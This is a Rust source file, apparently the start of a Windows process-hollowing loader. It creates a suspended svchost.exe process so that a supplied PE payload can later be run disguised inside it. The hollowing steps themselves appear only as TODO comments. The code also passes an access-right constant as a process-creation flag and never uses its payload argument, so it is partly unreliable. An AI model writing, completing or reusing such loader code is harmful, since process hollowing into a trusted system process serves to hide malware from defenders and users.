use winapi::{
    shared::{minwindef::FALSE, ntstatus::STATUS_SUCCESS},
    um::{
        processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA},
        winbase::CREATE_SUSPENDED,
        winnt::PROCESS_QUERY_INFORMATION,
    },
};

/// Create a suspended process that will be used to run the PE
unsafe fn create_process() -> Result<PROCESS_INFORMATION, String> {
    let mut startup_info: STARTUPINFOA = std::mem::zeroed();
    startup_info.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

    let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

    let app_name = std::ffi::CString::new("C:\\Windows\\System32\\svchost.exe")
        .expect("Failed to create CString");

    let success = CreateProcessA(
        app_name.as_ptr(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        FALSE,
        CREATE_SUSPENDED | PROCESS_QUERY_INFORMATION,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut startup_info,
        &mut process_info,
    );

    if success == STATUS_SUCCESS {
        Err(format!(
            "CreateProcessA failed: {}",
            std::io::Error::last_os_error()
        ))
    } else {
        Ok(process_info)
    }
}

/// Execute process hollowing for our PE on svchost.exe process
pub unsafe fn execute_on_remote_thread(pe_data: &[u8]) -> Result<(), &str> {
    let created_process = create_process().expect("Failed to create process for PE");

    // TODO: 
    // 1. Get base address of the previous process
    // 2. Remove that entry point (base addr)
    // 3. Replace the process with our executable
    // 4. Set the entry point correctly for new executable
    // 5. Resume the thread

    // TODO: Only resume after everything is done
    // ResumeThread(created_process.hThread);

    Ok(())
}
